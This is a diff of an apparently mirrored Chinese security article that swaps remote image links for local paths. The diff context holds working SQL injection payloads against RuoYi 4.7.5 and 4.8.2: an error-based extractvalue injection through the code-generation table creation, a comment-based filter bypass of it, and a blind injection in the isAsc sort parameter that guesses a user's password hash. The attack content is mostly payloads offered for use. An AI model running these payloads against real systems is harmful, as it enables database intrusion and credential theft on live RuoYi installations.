@@ -46,22 +46,22 @@ schema_version: "1"
 CREATE table a1 as SELECT extractvalue(1,concat(0x7e,(select database())));
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDp8ZlnXxsAmO3Pe4YGQeX2ZUZAlEiayFgD0ewXzicaYhvyqiayMlMviaEXNA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/6436e1e60e62d34b69f59931f47f341c98e6409c43ab40e7bcfab24c9176fdf5.png "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDpxXxU0OJFxtRwwAoQzTXnWpXyrpTVueiaIgJHLg46GJXmedLmI5c7PmQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/be720615c1797012f7da53c37db7a4fb3024244426fdaefe20ab3bd9be172d15.png "")  
 # 2. RuoYi-4.7.5  
 ## 2.1. SQL注入  
   
 代码生成-创建  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDp9xEyPfjY2VSY4xDKU7axUZyS4EZ26wUiaFqhSxFU0FjH7IE71fVAtxw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/cec8844f223813cc62027764074d340f49cf643fa6481f5b7f12bfd88f520011.png "")  
   
 绕过  
 ```
 CREATE table a1 as SELECT/**/extractvalue(1,concat(0x7e,(select/**/database())));
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDpr6INqH5QEabcPaokHoJHKURdDYg5WZhfHplK0h7vwyIE3qql2oyX1Q/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/b2e79050ab104af4dd1473ef8bd3332b5afdcc9242939bf609108d81f38e3056.png "")  
 # 3. RuoYi-4.8.2  
 ## 3.1. SQL注入  
 ```
@@ -83,11 +83,11 @@ Connection: keep-alive
 pageNum=1&pageSize=10&orderByColumn=status&isAsc=,CASE WHEN u.user_id LIKE 2 THEN CASE WHEN u.password LIKE 0x24326125 THEN 0 ELSE 2 END ELSE 1 END
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDp7ODRRNtAL8rbIdZjRDjSJ6AzgGzaHlWUVggqDMShay5wurDY4syIyA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/41bd785a10af7c4df8e5e549313db2118705d2e1a4f400c91ee6463289898bdf.png "")  
   
 更多内容进群了解哈。  
   
-![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/X5epWh2K2OrPlho8vhCVYz7j2m9wiatMmeKTk7X3xzTFjnTrkSiaLqCMmByZxL4Z15HXV5R0Da0n6kKJSDwicLzuQ/640?wx_fmt=jpeg&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=24 "")  
+![图片](../../.resource/remote/d404ec01062b9c92dc7365a7db7af1d1f280ea709c327c3874a73c612cd89d9c.webp "")  
   
 
 
